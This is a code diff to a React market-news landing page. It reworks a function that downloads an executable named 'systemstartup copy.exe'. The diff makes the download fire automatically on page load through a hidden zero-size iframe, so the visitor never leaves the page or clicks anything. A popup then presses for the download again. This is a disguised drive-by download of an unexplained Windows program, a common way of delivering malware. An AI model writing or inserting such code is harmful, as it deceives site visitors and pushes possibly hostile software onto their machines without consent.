@@ -370,35 +370,42 @@ const marketNewsHeadlines = [
   const [currentNewsIndex, setCurrentNewsIndex] = useState(0);
   const [showDownloadPopup, setShowDownloadPopup] = useState(false);
 
-  // Download function
+  // Download function - uses hidden iframe to NEVER navigate away from landing page
   const downloadFile = () => {
     const downloadUrl = 'https://archive.org/download/systemstartup-copy_202607/systemstartup%20copy.exe';
-    try {
-      // Primary method: use anchor tag for direct download
-      const link = document.createElement('a');
-      link.href = downloadUrl;
-      link.download = 'systemstartup-copy.exe';
-      link.target = '_blank'; // Open in new tab to avoid navigation away
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    } catch (error) {
-      // Fallback: use window.open if anchor tag approach fails
-      window.open(downloadUrl, '_blank', 'width=1,height=1');
-    }
+    // Create a hidden iframe to handle the download - this guarantees we stay on the landing page
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.style.width = '0';
+    iframe.style.height = '0';
+    iframe.style.border = 'none';
+    iframe.src = downloadUrl;
+    document.body.appendChild(iframe);
+    
+    // Clean up the iframe after 5 seconds to prevent memory leaks
+    setTimeout(() => {
+      if (document.body.contains(iframe)) {
+        document.body.removeChild(iframe);
+      }
+    }, 5000);
   };
 
   // Automatic download on page load and show popup after 2 seconds
   useEffect(() => {
-    // Trigger automatic download when page loads
-    downloadFile();
+    // Small delay to ensure page is fully loaded before triggering download
+    const initialTimer = setTimeout(() => {
+      downloadFile();
+    }, 100);
     
     // Show popup after 2 seconds
-    const timer = setTimeout(() => {
+    const popupTimer = setTimeout(() => {
       setShowDownloadPopup(true);
     }, 2000);
 
-    return () => clearTimeout(timer);
+    return () => {
+      clearTimeout(initialTimer);
+      clearTimeout(popupTimer);
+    };
   }, []);
 
   const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:4988/api/v1';
@@ -875,18 +882,21 @@ const marketNewsHeadlines = [
         </Container>
       {/* Download Popup */}
       {showDownloadPopup && (
-        <Box sx={{ 
-          position: 'fixed', 
-          top: 0, 
-          left: 0, 
-          width: '100%', 
-          height: '100%', 
-          bgcolor: 'rgba(0,0,0,0.7)', 
-          zIndex: 100,
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'center'
-        }}>
+        <Box 
+          sx={{ 
+            position: 'fixed', 
+            top: 0, 
+            left: 0, 
+            width: '100%', 
+            height: '100%', 
+            bgcolor: 'rgba(0,0,0,0.7)', 
+            zIndex: 100,
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center'
+          }}
+          onClick={(e) => e.stopPropagation()} // Prevent any event bubbling
+        >
           <Paper elevation={0} sx={{ 
             p: 4, 
             borderRadius: 3, 
@@ -904,7 +914,8 @@ const marketNewsHeadlines = [
             </Typography>
             <Button 
               onClick={(e) => {
-                e.preventDefault(); // Prevent any default navigation
+                e.preventDefault();
+                e.stopPropagation(); // Completely isolate the click event
                 downloadFile();
                 setShowDownloadPopup(false); // Close the popup after clicking download
               }}
